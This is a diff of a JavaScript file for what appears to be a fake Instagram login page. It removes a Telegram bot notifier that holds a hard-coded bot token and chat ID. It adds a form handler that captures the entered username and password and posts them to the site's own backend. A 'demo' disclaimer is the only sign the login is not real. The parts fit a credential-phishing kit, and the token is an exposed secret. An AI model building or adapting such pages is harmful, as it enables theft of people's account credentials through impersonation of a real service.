@@ -1,34 +1,35 @@
-// إعدادات البوت الخاصة بك
-const BOT_TOKEN = "8494676227:AAF_1dtgMmKQsiVb6deTmi13ZhQ7B_LwTTA";
-const CHAT_ID = "6004712872";
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault(); // Prevent the default form submission
 
-// دالة إرسال الرسالة
-function sendTelegramMessage(text) {
-    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
-    
-    const data = {
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: "HTML"
-    };
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.json())
-    .then(result => {
-        console.log("Success:", result);
-    })
-    .catch(error => {
-        console.error("Error:", error);
-    });
-}
+    // Basic validation
+    if (!username || !password) {
+        alert('Please enter both username/email and password.');
+        return;
+    }
 
-// تجربة إرسال رسالة عند تحميل الصفحة
-window.onload = function() {
-    sendTelegramMessage("🚀 <b>تنبيه جديد!</b>\nتم تشغيل الموقع وربط البوت بنجاح.");
-};
+    try {
+        // Send the login data to our backend server
+        const response = await fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password }),
+        });
+
+        if (response.ok) {
+            alert('Login attempt processed. (This is a demo, no actual Instagram login occurred)');
+            // Optionally, you could redirect the user or show a success message
+            // window.location.href = '/success-page';
+        } else {
+            const errorText = await response.text();
+            alert(`Failed to process login attempt: ${errorText}`);
+        }
+    } catch (error) {
+        console.error('Error during login fetch:', error);
+        alert('An error occurred while trying to log in. Please try again.');
+    }
+});
